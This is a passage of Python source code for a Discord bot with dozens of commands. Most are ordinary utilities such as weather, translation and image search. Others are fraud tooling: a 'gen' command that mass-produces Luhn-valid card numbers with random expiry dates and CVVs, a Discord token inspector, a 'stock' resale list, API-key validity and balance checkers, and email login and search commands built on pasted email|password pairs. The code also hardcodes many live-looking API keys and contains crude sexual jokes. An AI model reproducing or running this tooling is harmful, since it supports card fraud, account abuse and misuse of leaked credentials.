                    await ctx.send(f'Token: {token}\nNitro: {nitro_text}\nBadges: {badge_text}')
                else:
                    await ctx.send('Invalid token or failed to fetch user data.')
    except Exception as e:
        await ctx.send(f'An error occurred: {str(e)}')
openai.api_key = "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"
@bot.command()
async def chatgpt(ctx, *, question):
    # Generate a response using the ChatGPT API
    response = openai.Completion.create(
        engine="text-davinci-003",
        prompt=question,
        max_tokens=50,
        n=1,
        stop=None,
        temperature=0.7,
        top_p=1.0,
        frequency_penalty=0.0,
        presence_penalty=0.0
    )
  
    await ctx.send(response.choices[0].text)


    
    # Send the response back to the Discord channel
    await ctx.send(response.choices[0].text)
@bot.command()
async def getany(ctx, crypto_address: str):
    api_url = f"https://api.blockchair.com/{crypto_address_network}/dashboards/address/{crypto_address}"
    
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        
        balance = data['data'][crypto_address]['address']['balance']
        
        await ctx.send(f"Balance of {crypto_address}: {balance}")
    else:
        await ctx.send("Failed to fetch balance.")
API_ENDPOINT = 'https://rest.coinapi.io/v1/exchangerate/{}/{}'
API_KEY = '7968eaea-a5d8-4555-995f-2de04aa22b81'  # Replace with your CoinAPI key

@bot.command()
async def crypto_convert(ctx, amount: float, crypto: str, currency: str):
    """
    Converts the given amount of cryptocurrency to the specified currency.
    Usage: !convert <amount> <crypto> <currency>
    Example: !convert 0.5 btc usd
    """


    crypto = crypto.upper()
    currency = currency.upper()

    # Prepare API endpoint with the provided symbols
    api_url = API_ENDPOINT.format(crypto, currency)

    try:
        # Send GET request to the API with authentication headers
        headers = {'X-CoinAPI-Key': API_KEY}
        response = requests.get(api_url, headers=headers)
        data = response.json()

        # Extract the conversion rate
        rate = data['rate']

        # Calculate the converted amount
        converted_amount = amount * rate

        # Format the response message
        message = f'{amount} {crypto} is equal to {converted_amount} {currency}.'

        await ctx.send(message)
    except Exception as e:
        await ctx.send(f'An error occurred: {str(e)}')
statuses = [
    discord.Status.online,
    discord.Status.dnd,
    discord.Status.idle
]

activities = [
    discord.Activity(type=discord.ActivityType.playing, name=".gg/xclouds .gg/razenbot"),
    discord.Activity(type=discord.ActivityType.listening, name="Someone?"),
    discord.Activity(type=discord.ActivityType.streaming, name='Cock', url='https://curiousretard.com'),
    discord.Activity(type=discord.ActivityType.watching, name="The Dark Knight"),
]

class StatusCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.status_index = 0
        self.activity_index = 0
        self.change_status.start()

    def cog_unload(self):
        self.change_status.cancel()

    @tasks.loop(seconds=10)
    async def change_status(self):
        await self.bot.change_presence(status=statuses[self.status_index], activity=activities[self.activity_index])
        self.status_index = (self.status_index + 1) % len(statuses)
        self.activity_index = (self.activity_index + 1) % len(activities)

    @change_status.before_loop
    async def before_change_status(self):
        await self.bot.wait_until_ready()

@bot.command()
async def start_status(ctx):
    cog = StatusCog(bot)
    bot.add_cog(cog)
    await ctx.send("Status changing has been started!")

@bot.command()
async def stop_status(ctx):
    for cog in bot.cogs.values():
        if isinstance(cog, StatusCog):
            cog.cog_unload()
    await ctx.send("Status changing has been stopped!")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return

@bot.command()
async def ytvid(ctx, *, query):
    results = YoutubeSearch(query, max_results=4).to_dict()

    links = [f"[{result['title']}](https://www.youtube.com/watch?v={result['id']})" for result in results]
    response = "\n".join(links)

    await ctx.send(f"**Top 4 Results for '{query}' on YouTube:**\n{response}") 
@bot.command()
async def bin(ctx, bin_number: str):
    url = f"https://lookup.binlist.net/{bin_number}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()

        if "bank" in data:
            issuer = data["bank"]["name"]
        else:
            issuer = "Unknown"

        if "country" in data:
            country = data["country"]["name"]
        else:
            country = "Unknown"

        await ctx.send(f"Issuer: {issuer}\nCountry: {country}")
    else:
        await ctx.send("Invalid BIN or an error occurred.")
@bot.command()
async def addstock(ctx, stock: str, filename: str):
    # Open the text file in append mode and write the stock value on a new line
    with open(filename, 'a') as file:
        file.write(stock + '\n')
    await ctx.send(f'Stock "{stock}" has been added to {filename}.')

@bot.command()
async def getstock(ctx, amount: int):
    # Read the text file and retrieve the specified number of stock items
    with open('stock.txt', 'r') as file:
        stocks = file.read().splitlines()
    if amount > len(stocks):
        await ctx.send('Not enough stock available.')
    else:
        selected_stocks = stocks[:amount]
        await ctx.send('\n'.join(selected_stocks))

@bot.command()
async def deletestock(ctx):
    # Delete the entire stock by truncating the file
    with open('stock.txt', 'w') as file:
        file.truncate()
    await ctx.send('All stock items have been deleted.')  

# API endpoint for math calculations
api_endpoint = 'https://api.mathjs.org/v4/'
@bot.command()
async def math(ctx, *, equation):
    # Send the equation to the math API for calculation
    response = requests.get(api_endpoint, params={'expr': equation})

    if response.status_code == 200:
        result = response.text
        await ctx.send(f'Result: {result}')
    else:
        await ctx.send('Failed to calculate the equation.')
@bot.command()
async def capmonster(ctx, api_key):
    response = requests.post('https://api.capmonster.cloud/getBalance', json={
        'clientKey': api_key
    })
    if response.status_code == 200:
        balance = response.json()['balance']
        await ctx.send(f'[ + ] Capmonster API Key Balance : ${balance}.Credits - Dev Dream')
    else:
        await ctx.send('[ - ] Invalid API key provided.Credits - Dev Dream')
@bot.command()
async def hotmailbox(ctx, api_key):
    response = requests.get(f'https://api.hotmailbox.me/user/balance?apikey={api_key}')
    if response.status_code == 200:
        response_json = response.json()
        if 'BalanceUsd' in response_json:
            balance_usd = response_json['BalanceUsd']
            await ctx.send(f'[ + ] Hotmailbox API Key Balance : ${balance_usd}')
        else:
            await ctx.send('[ - ] Invalid API key provided.Credits - Dev Dream')
    else:
        await ctx.send('[ - ] Invalid API key provided.-Credits Dev Dream')

@bot.command()
async def kopeechka(ctx, api_key):
    response = requests.get(f'https://api.kopeechka.store/user-balance?token={api_key}&type=json&api=2.0')
    if response.status_code == 200:
        response_json = response.json()
        if 'balance' in response_json:
            balance = response_json['balance']
            await ctx.send(f'[ + ] Kopeechka API Key Balance : {balance} Credits - Dev Dream ')
        else:
            await ctx.send('[ - ] Invalid API key provided.- Credits Dev Dream')
    else:
        await ctx.send('[ - ] Invalid API key provided.')
@bot.command()
async def gen(ctx, bin, amount):
    # Check if the amount is valid
    try:
        amount = int(amount)
        if amount < 1 or amount > 3000:
            raise ValueError
    except ValueError:
        await ctx.send("Please provide a valid amount between 1 and 3000.")
        return

    # Generate and validate card details
    cards = []
    for _ in range(amount):
        card = list(bin)
        while len(card) < 16:
            digit = random.choice("0123456789")
            card.append(digit)
        luhn_sum = 0
        for i, digit in enumerate(reversed(card)):
            if i % 2 == 0:
                double = int(digit) * 2
                if double > 9:
                    double -= 9
                luhn_sum += double
            else:
                luhn_sum += int(digit)
        checksum = (luhn_sum * 9) % 10
        card.append(str(checksum))

        # Generate random expiry month, expiry year, and CVV
        expiry_month = str(random.randint(1, 12)).zfill(2)
        expiry_year = str(random.randint(23, 30)).zfill(2)
        cvv = str(random.randint(100, 999)).zfill(3)

        card_details = "|".join(["".join(card), expiry_month, expiry_year, cvv])
        cards.append(card_details)

    # Save card details to a text file
    filename = f"{bin}_{amount}_cards.txt"
    with open(filename, "w") as file:
        file.write("\n".join(cards))

    # Send the text file to Discord
    await ctx.send(file=discord.File(filename))    
@bot.command()
async def checkpromo(ctx, *, promo_links):
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code)
                await ctx.send(result)
            else:
                await ctx.send(f'Invalid promo link: {link}')

async def check_promo(session, promo_code):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'Already Claimed -> {promo_code}'
            else:
                try:
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "Failed To Fetch!"
                    days = "Failed To Parse!"
                    title = "Failed To Fetch!"
                return f'Valid -> {promo_code} | Days Left: {days} | Expires At: {exp_at} | Title: {title}'
        elif response.status == 429:
            return f'Rate Limited for {response.headers["retry-after"]} seconds'
        else:
            return f'Invalid Code -> {promo_code}'

def extract_promo_code(promo_link):
    promo_code = promo_link.split('/')[-1]
    return promo_code
@bot.command()
@commands.has_permissions(manage_channels=True)
async def delete_channel(ctx, channel: discord.TextChannel):
    try:
        # Delete the specified channel
        await channel.delete()
        await ctx.send(f"The channel {channel.name} has been deleted.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete that channel.")
    except discord.HTTPException:
        await ctx.send("An error occurred while deleting the channel.")
@bot.command()
async def gptcheck(ctx, api_key):
    # Make a request to the API to check the validity of the key
    url = 'https://api.openai.com/v1/engines/davinci-codex/completions'
    headers = {
        'Authorization': f'Bearer {api_key}',
        'Content-Type': 'application/json'
    }
    payload = {
        'prompt': 'Hello, world!',
        'max_tokens': 5
    }

    response = requests.post(url, headers=headers, json=payload)

    if response.status_code == 200:
        await ctx.send('API key is valid!')
    else:
        await ctx.send('Invalid API key.')
@bot.command()
async def leaveserver(ctx, server_id):
    try:
        server = bot.get_guild(int(server_id))
        if server is None:
            raise ValueError("Invalid server ID.")

        await server.leave()
        await ctx.send(f"Left the server with ID {server.id}!")

    except discord.HTTPException as e:
        await ctx.send(f"An error occurred while leaving the server: {e}")

    except ValueError as e:
        await ctx.send(f"Invalid server ID: {e}")
@bot.command()
async def serversinfo(ctx):
    member = ctx.author

    total_servers = len(bot.guilds)
    admin_servers = []

    for guild in bot.guilds:
        if member.guild_permissions.administrator:
            admin_servers.append(guild.name)

    admin_server_list = "\n".join(admin_servers)

    message = f"You are a member of {total_servers} server(s).\n\n" \
              f"Servers where you have administrator privileges:\n{admin_server_list}"

    await ctx.send(message)
@bot.command()
async def system_info(ctx):
    disk_usage = psutil.disk_usage('/')
    cpu_info = psutil.cpu_percent(interval=1, percpu=True)
    disk_partitions = psutil.disk_partitions()

    # Disk usage
    total_disk_space = f"Total disk space: {disk_usage.total / (1024**3):.2f} GB"
    used_disk_space = f"Used disk space: {disk_usage.used / (1024**3):.2f} GB"
    free_disk_space = f"Free disk space: {disk_usage.free / (1024**3):.2f} GB"
    disk_usage_percentage = f"Disk usage percentage: {disk_usage.percent}%"

    # CPU info
    cpu_info_str = '\n'.join(f"CPU {i}: {usage}%" for i, usage in enumerate(cpu_info))

    # Disk info
    disk_info_str = '\n'.join(f"Device: {partition.device}, Mountpoint: {partition.mountpoint},"
                              f" Filesystem: {partition.fstype}" for partition in disk_partitions)

    response = f"{total_disk_space}\n{used_disk_space}\n{free_disk_space}\n{disk_usage_percentage}\n\n" \
               f"{cpu_info_str}\n\n{disk_info_str}"

    await ctx.send(response)  
startup_time = datetime.datetime.now()
@bot.command()
async def uptime(ctx):
    now = datetime.datetime.now()
    uptime = now - startup_time
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)

    uptime_str = f"{days} days, {hours} hours, {minutes} minutes, {seconds} seconds"
    await ctx.send(f"Bot Uptime: {uptime_str}")
@bot.command()
async def tixsave(ctx):
    await ctx.send('$transcript <@1109678224281190440>')
@bot.command()
async def errorfix(ctx, *, error: str):
    try:
        # Search for error fixes using Google search
        query = f"{error} fix"
        search_results = search(query, num_results=5)

        # Get the most popular solution from the search results
        top_solution = next(search_results, None)

        if top_solution:
            await ctx.send(f"Here's a popular solution for the error:\n{top_solution}")
        else:
            await ctx.send("No solution found for the error.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
API_XD = "9bd8c64f65124903b9129d2d52a5d130"  # Replace with your NewsAPI key
@bot.command()
async def footballnews(ctx):
    url = f"https://newsapi.org/v2/top-headlines?q=football&apiKey={API_XD}"
    response = requests.get(url)
    news_data = response.json()

    for article in news_data['articles']:
        title = article['title']
        description = article['description']
        source = article['source']['name']
        url = article['url']
        
        message = f"**{title}**\n{description}\nSource: {source}\nRead More: {url}"
        await ctx.send(message)
API_ASS = "K84396224988957"
@bot.command()
async def readtext(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image.")
        return

    image_url = ctx.message.attachments[0].url

    try:
        payload = {
            "url": image_url,
            "apikey": API_ASS
        }

        response = requests.post("https://api.ocr.space/parse/image", data=payload)
        result = response.json()

        if result["IsErroredOnProcessing"]:
            await ctx.send("Error occurred during image processing.")
        elif result["ParsedResults"]:
            text = result["ParsedResults"][0]["ParsedText"]
            await ctx.send(text)
        else:
            await ctx.send("No text found in the image.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
@bot.command()
async def serverinfo(ctx):
    guild = ctx.guild
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    members = len(guild.members)
    roles = len(guild.roles)
    online_members = sum(member.status != discord.Status.offline for member in guild.members)

    server_info = f"Server Name: {guild.name}\n"
    server_info += f"Server ID: {guild.id}\n"
    server_info += f"Owner: {guild.owner}\n"
    server_info += f"Region: {guild.region}\n"
    server_info += f"Total Members: {members}\n"
    server_info += f"Online Members: {online_members}\n"
    server_info += f"Text Channels: {text_channels}\n"
    server_info += f"Voice Channels: {voice_channels}\n"
    server_info += f"Roles: {roles}\n"

    await ctx.send(server_info)

@bot.command()
async def roleinfo(ctx, *, role: discord.Role):
    role_info = f"Role Name: {role.name}\n"
    role_info += f"Role ID: {role.id}\n"
    role_info += f"Role Color: {role.color}\n"
    role_info += f"Role Created At: {role.created_at}\n"
    role_info += f"Role Members: {len(role.members)}\n"
    role_info += f"Role Permissions: {role.permissions.value}\n"

    await ctx.send(role_info)
@bot.command()
async def dm(ctx, member: discord.Member, *, message: str):
    await member.send(message)
    await ctx.send(f"Message sent to {member.mention}")

@bot.command()
async def searchmath(ctx, *, query):
    # Create the Google search query
    search_query = f'{query} math solutions'

    # Perform the Google search and get the top three results
    search_results = search(search_query, num_results=3)

    # Prepare the response message
    message = 'Top 3 math solutions:\n'
    for index, result in enumerate(search_results, start=1):
        message += f'{index}. {result}\n'

    # Send the response message
    await ctx.send(message)
@bot.command()
async def btcbal(ctx, address):
    # Set up the Blockcypher API endpoint
    api_url = f'https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance'

    try:
        # Send a GET request to the Blockcypher API
        response = requests.get(api_url)

        # Check if the request was successful
        if response.status_code == 200:
            data = response.json()

            # Extract the balance from the API response
            balance = data['balance'] / 10**8
            await ctx.send(f'Bitcoin Balance for address {address}: {balance} BTC')
        else:
            await ctx.send(f'API error: {response.status_code}')

    except requests.exceptions.RequestException as e:
        await ctx.send(f'API error: {str(e)}')
@bot.command()
async def tr(ctx, address, coin):
    # Check if the coin is either "btc" or "ltc"
    if coin.lower() not in ['btc', 'ltc']:
        await ctx.send("Invalid coin. Please choose either 'btc' or 'ltc'.")
        return

    # Set up the Blockcypher API endpoint
    api_url = f'https://api.blockcypher.com/v1/{coin.lower()}/main/addrs/{address}/balance'

    try:
        # Send a GET request to the Blockcypher API
        response = requests.get(api_url)

        # Check if the request was successful
        if response.status_code == 200:
            data = response.json()

            # Extract the total transaction amount from the API response
            total_transactions = data['total_received'] / 10 ** 8
            await ctx.send(f'Total transactions for {coin.upper()} address {address}: {total_transactions} {coin.upper()}')
        else:
            await ctx.send(f'API error: {response.status_code}')

    except requests.exceptions.RequestException as e:
        await ctx.send(f'API error: {str(e)}')
@bot.command()
async def rndaddress(ctx):
    # Make a request to the Random User Generator API
    response = requests.get('https://randomuser.me/api/')
    data = response.json()

    # Extract the address information from the API response
    address_info = data['results'][0]['location']

    # Use Faker to generate a random name for testing purposes
    fake_name = fake.name()

    # Format the address information
    address = f'{fake_name}\n{address_info["street"]["number"]} {address_info["street"]["name"]}\n{address_info["city"]}, {address_info["state"]}, {address_info["country"]} {address_info["postcode"]}'

    # Send the generated address as a reply
    await ctx.send(address)
@bot.command()
async def nsfwwaifu(ctx):
    response = requests.get("https://api.waifu.pics/nsfw/waifu")

    if response.status_code == 200:
        waifu_data = response.json()
        waifu_url = waifu_data["url"]
        await ctx.send(waifu_url)
    else:
        await ctx.send("Failed to fetch an anime girl picture. Try again later.")
@bot.command()
async def nsfwneko(ctx):
    response = requests.get("https://api.waifu.pics/nsfw/neko")

    if response.status_code == 200:
        waifu_data = response.json()
        waifu_url = waifu_data["url"]
        await ctx.send(waifu_url)
    else:
        await ctx.send("Failed to fetch an anime girl picture. Try again later.")
@bot.command()
async def nsfwtrap(ctx):
    response = requests.get("https://api.waifu.pics/nsfw/trap")

    if response.status_code == 200:
        waifu_data = response.json()
        waifu_url = waifu_data["url"]
        await ctx.send(waifu_url)
    else:
        await ctx.send("Failed to fetch an anime girl picture. Try again later.")
@bot.command()
async def channelinfo(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel
    channel_id = channel.id
    channel_name = channel.name
    channel_topic = channel.topic or "No topic set"
    response = f"Channel ID: {channel_id}\nChannel Name: {channel_name}\nChannel Topic: {channel_topic}"
    await ctx.send(response)
unsplash_access_key = 's8neBEpVxPxjyCq4K0K-v8c9Db9Oym2FijXWyCcNij0'
@bot.command()
async def findphoto(ctx, location):
    # Set up the API request to Unsplash
    url = 'https://api.unsplash.com/photos/random'
    headers = {'Authorization': f'Client-ID {unsplash_access_key}'}
    params = {'query': location, 'orientation': 'landscape'}

    # Send the API request
    response = requests.get(url, headers=headers, params=params)

    if response.status_code == 200:
        data = response.json()
        if data and 'urls' in data and 'regular' in data['urls']:
            photo_url = data['urls']['regular']
            await ctx.send(photo_url)
        else:
            await ctx.send("Sorry, I couldn't find a photo for that location.")
    else:
        await ctx.send("An error occurred while fetching the photo.")
google_api_key = 'AIzaSyDqk7JHB56dMBW8Fmd0kYG6d98-GSAf6k0'
search_engine_id = '80db58308412546d9'
@bot.command()
async def photosearch(ctx, *, query):
    # Set up the API request to Google CSE
    url = 'https://www.googleapis.com/customsearch/v1'
    params = {
        'key': google_api_key,
        'cx': search_engine_id,
        'q': query,
        'searchType': 'image',
        'num': 1  # Number of results to retrieve (change as needed)
    }

    # Send the API request
    response = requests.get(url, params=params)

    if response.status_code == 200:
        data = response.json()
        if 'items' in data and len(data['items']) > 0:
            image_url = data['items'][0]['link']
            await ctx.send(image_url)
        else:
            await ctx.send("Sorry, I couldn't find any photos for that query.")
    else:
        await ctx.send("An error occurred while fetching the photos.")
@bot.command()
async def base64encode(ctx, *, message):
    encoded_message = base64.b64encode(message.encode()).decode()
    await ctx.send(f'Base64 Encoded: {encoded_message}')

@bot.command()
async def base64decode(ctx, *, encoded_message):
    try:
        decoded_message = base64.b64decode(encoded_message).decode()
        await ctx.send(f'Base64 Decoded: {decoded_message}')
    except base64.binascii.Error:
        await ctx.send('Invalid Base64 encoded message.')
api_key = '7f37c925-57ab-bb63-ef54-fd52bb201d54:fx'  
@bot.command()
async def translate(ctx, source_lang, target_lang, *, text):
    try:
        headers = {
            'Authorization': f'DeepL-Auth-Key {api_key}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        payload = {
            'text': text,
            'source_lang': source_lang,
            'target_lang': target_lang
        }
        response = requests.post('https://api-free.deepl.com/v2/translate', headers=headers, data=payload)
        translation_data = response.json()
        translated_text = translation_data['translations'][0]['text']

        translation_message = (
            f"**Translation**\n"
            f"Source Language: {source_lang}\n"
            f"Target Language: {target_lang}\n"
            f"Source Text: {text}\n"
            f"Translated Text: {translated_text}"
        )

        await ctx.send(translation_message)
    except KeyError:
        await ctx.send("Translation failed. Please check your language codes or try again later.")
WOLFRAM_APP_ID = 'J9W38H-9W6RY6KYL8'
@bot.command()
async def wolfram(ctx, *, query):
    # Create a Wolfram Alpha client instance
    client = wolframalpha.Client(WOLFRAM_APP_ID)

    try:
        # Query the Wolfram Alpha API
        res = client.query(query)
        result = next(res.results).text  # Retrieve the primary result

        # Send the result as a message in the Discord channel
        await ctx.send(result)

    except (wolframalpha.WolframAlphaError, StopIteration):
        await ctx.send('Sorry, I could not find an answer to that query.')

    except Exception as e:
        await ctx.send(f'An error occurred: {e}')
@bot.command()
async def mapsearch(ctx, *, location):
    # Construct the API request URL
    url = f"https://nominatim.openstreetmap.org/search?format=json&q={location}"

    headers = {'User-Agent': 'OneAndOnlyDibyu#7970'}

    # Make a GET request to the OpenStreetMap API
    response = requests.get(url, headers=headers)
    data = response.json()

    if len(data) > 0:
        # Get the first result
        result = data[0]
        
        # Get the formatted address and location
        formatted_address = result['display_name']
        lat = result['lat']
        lon = result['lon']

        # Create a text message with the information
        message = f"**OpenStreetMap Search Result**\n\n**Address:** {formatted_address}\n**Coordinates:** Latitude: {lat}, Longitude: {lon}"
        
        # Send the message to the channel
        await ctx.send(message)
    else:
        await ctx.send(f"No results found for '{location}'.")

@bot.command()
async def weather(ctx, *, city: str):
    api_key = "c9f448f65cda132e2f1c4ca0ea2667aa"  # Replace with your OpenWeatherMap API Key
    base_url = "http://api.openweathermap.org/data/2.5/weather?"

    complete_url = base_url + "appid=" + api_key + "&q=" + city

    response = requests.get(complete_url)
    data = response.json()

    if data["cod"] != "404":
        main = data['main']
        temperature = main['temp']
        humidity = main['humidity']
        pressure = main['pressure']
        weather_report = data['weather']

        await ctx.send(f"Temperature : {temperature} \nHumidity : {humidity}% \nPressure : {pressure} hPa \nDescription : {weather_report[0]['description']}")
    else:
        await ctx.send("City Not Found!")

@bot.command()
@commands.has_permissions(ban_members=True)
async def massban(ctx, members: commands.Greedy[discord.Member], *, reason=None):
    for member in members:
        await member.ban(reason=reason)
    await ctx.send(f"Banned {', '.join([member.name for member in members])} for {reason}")
@bot.command()
async def copyserver(ctx, source_guild_id: int, target_guild_id: int):
    source_guild = bot.get_guild(source_guild_id)
    target_guild = bot.get_guild(target_guild_id)

    if not source_guild or not target_guild:
        await ctx.send("One of the guilds wasn't found!")
        return

    # Clone roles from source to target
    roles = sorted(source_guild.roles, key=lambda role: role.position)

    for role in roles:
        if role.name != "@everyone":
            await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
            await ctx.send(f"Role {role.name} has been created on the target guild.")
            await asyncio.sleep(20) #Add delay here

    # Clone channels from source to target
    text_channels = sorted(source_guild.text_channels, key=lambda channel: channel.position)
    voice_channels = sorted(source_guild.voice_channels, key=lambda channel: channel.position)

    for channel in text_channels:
        await target_guild.create_text_channel(name=channel.name)
        await ctx.send(f"Text Channel {channel.name} has been created on the target guild.")
        await asyncio.sleep(20)  # Add delay here

    for channel in voice_channels:
        await target_guild.create_voice_channel(name=channel.name)
        await ctx.send(f"Voice Channel {channel.name} has been created on the target guild.")
        await asyncio.sleep(20)  # Add delay here
forced_nicks = {}
@bot.command(name='forcenick', aliases=['fucknick','fn'], brief="Force a users nickname", usage=".forcenick <mention.user> <nick.name>")
@commands.has_permissions(manage_nicknames=True)
async def forcenick(ctx, user: discord.Member, *, nickname: str):
    forced_nicks[user.id] = nickname
    try:
        await user.edit(nick=nickname)
        await ctx.send(f"Fucked nickname '{nickname}' on {user.display_name}.")
    except discord.Forbidden:
        await ctx.send("I dont have perms to edit nn")

@bot.command(name='stopforcenick', aliases=['sfn','stopfucknick'], brief="Stop force kicking the user", usage=".stopforcenick <mention.user>")
@commands.has_permissions(manage_nicknames=True)
async def stopforcenick(ctx, user: discord.Member):
    if user.id in forced_nicks:
        del forced_nicks[user.id]
        try:
            await user.edit(nick=None)
            await ctx.send(f"Stopped fucking nickname on {user.display_name}.")
        except discord.Forbidden:
            await ctx.send("I dont have perms to edit nn")
    else:
        await ctx.send(f"No forced nickname found for {user.display_name}.")

@bot.event
async def on_member_update(before, after):
    if after.id in forced_nicks and after.nick != forced_nicks[after.id]:
        try:
            await after.edit(nick=forced_nicks[after.id])
        except discord.Forbidden:
            pass

@forcenick.error
async def forcenick_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have 'Manage Nicknames' perms")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Invalid user or nickname provided.")
    else:
        await ctx.send("An error occurred while executing the command.")

@stopforcenick.error
async def stopforcenick_error(ctx, error):
    """Error handler for stopforcenick command."""
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have 'Manage Nicknames' perms to use this cmd")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Invalid user provided.")
    else:
        await ctx.send("An error occurred while executing the command.")
@bot.command(name='massreact', aliases=['mreact'], brief="Mass react on last message", usage=".massreact")
@commands.has_permissions(add_reactions=True)
async def massreact(ctx):
    try:
        message = await ctx.channel.history(limit=2).flatten()
        message = message[1]  

        emojis = ["❤️", "🤍", "🖤", "💜", "🔥", "💧", "💨", "🍎", "🍇", "🍓", "🍒", "🌸", "🌺", "🌹", "🌷", "🌈", "⭐", "🌟", "🌙", "☀️"]
        
        random.shuffle(emojis)

        for emoji in emojis[:20]:  
            try:
                await message.add_reaction(emoji)
                await asyncio.sleep(1)  
            except discord.errors.HTTPException as e:
                if 'You are being rate limited.' in str(e):
                    delay = e.retry_after
                    await asyncio.sleep(delay)
                    await message.add_reaction(emoji)
                else:
                    raise e
    except Exception as e:
        error_message = f"An error occurred: {type(e).__name__} - {str(e)}"
        await ctx.send(error_message)
        await ctx.message.delete()

@massreact.error
async def massreact_error(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        error_message = "Sorry, an error occurred while executing the command."
        await ctx.send(error_message)
@bot.command(name='cum', aliases=['muth'], brief="Wanna cum?", usage=".cum")
@commands.has_permissions(manage_messages=False)
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
                :ok_hand:            :smile:
       :eggplant: :zzz: :necktie: :eggplant: 
                       :oil:     :nose:
                     :zap: 8=:punch:=D 
                 :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                          :ok_hand:            :smiley:
       :eggplant: :zzz: :necktie: :eggplant: 
                       :oil:     :nose:
                     :zap: 8==:punch:D 
                 :trumpet:      :eggplant:  
         ''')
    await asyncio.sleep(0.5)
    # ... add the rest of your message edits here ...

@cum.error
async def cum_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need to have 'Manage Messages' permissions to use this command.")
    else:
        await ctx.send("An error occurred while executing the command.")
@bot.command()
async def screenshot(ctx, url):
    api_ba = '0c8733' # Replace with your API Key
    endpoint = 'https://api.screenshotmachine.com'
    
    params = {
        'key': api_ba,
        'url': url,
        'dimension': '1024xfull', # choose a dimension you prefer
        'format': 'png',
        'cacheLimit': '0',
        'timeout': '200'
    }
    
    response = requests.get(endpoint, params=params)
    
    if response.status_code == 200:
        with open('screenshot.png', 'wb') as f:
            f.write(response.content)

        await ctx.send(file=discord.File('screenshot.png'))
        os.remove('screenshot.png') # remove the file after sending it
    else:
        await ctx.send('Failed to take screenshot.')
API_LOL = 'AIzaSyDqk7JHB56dMBW8Fmd0kYG6d98-GSAf6k0'
CX_ID = '80db58308412546d9'

@bot.command()
async def gimage(ctx, *, query: str):
    """Search for an image on Google."""
    url = 'https://www.googleapis.com/customsearch/v1'
    params = {
        'key': API_LOL,
        'cx': CX_ID,
        'q': query,
        'searchType': 'image',
        'num': 1
    }
    response = requests.get(url, params=params).json()
    try:
        image_url = response['items'][0]['link']
        await ctx.send(image_url)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
@bot.command()
async def serveronmc(ctx, server_ip):
    host, port = server_ip.split(':')
    response_time = ping(host, port=int(port), timeout=1)
    
    if response_time is not None:
        message = f"Server {server_ip} is online with a response time of {response_time} ms."
    else:
        message = f"Server {server_ip} is offline or unreachable."
    
    await ctx.send(message)
smtp_server = None
logged_in_email = None
@bot.command()
async def login(ctx, login_info: str):
    global smtp_server
    global logged_in_email

    email, password = login_info.split('|')
    
    try:
        smtp_server = smtplib.SMTP('smtp-mail.outlook.com', 587)
        smtp_server.starttls()
        smtp_server.login(email, password)
        logged_in_email = email
        await ctx.send("Successfully logged in.")
    except smtplib.SMTPException as e:
        await ctx.send(f"An error occurred while logging in: {str(e)}")

@bot.command()
async def send_email(ctx, recipient_email: str, message: str):
    global smtp_server
    global logged_in_email

    try:
        if not smtp_server:
            await ctx.send("Please log in using the login command first.")
            return

        # Compose the email
        from_address = logged_in_email
        to_address = recipient_email
        subject = 'Test Email'
        body = message
        email_message = f"From: {from_address}\r\nTo: {to_address}\r\nSubject: {subject}\r\n\r\n{body}"

        # Send the email
        smtp_server.sendmail(from_address, to_address, email_message)
        await ctx.send("Email sent successfully!")
    except smtplib.SMTPException as e:
        await ctx.send(f"An error occurred while sending the email: {str(e)}")

@bot.command()
async def logout(ctx):
    global smtp_server
    global logged_in_email

    if smtp_server:
        smtp_server.quit()
        smtp_server = None
        logged_in_email = None
        await ctx.send("Successfully logged out.")
    else:
        await ctx.send("No active email session to log out from.")
@bot.command()
async def search_emails(ctx, credentials: str, search_criteria: str, topic: str):
    email, password = credentials.split("|")

    # Establish an IMAP connection
    try:
        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com')
        mail.login(email, password)
    except imaplib.IMAP4.error as e:
        await ctx.send("Failed to log in. Please check your email and password.")
        return

    # Select the appropriate mailbox (e.g., 'INBOX') to search for emails
    mailbox = 'INBOX'
    try:
        mail.select(mailbox)
    except imaplib.IMAP4.error as e:
        await ctx.send(f"An error occurred while selecting the mailbox: {str(e)}")
        return

    # Search for emails matching the given criteria
    try:
        result, data = mail.search(None, search_criteria)

        if result == 'OK':
            email_ids = data[0].split()
            if email_ids:
                await ctx.send(f"Found {len(email_ids)} email(s) matching the criteria.")
                # Process the email IDs or fetch the email data as per your requirements
                for email_id in email_ids:
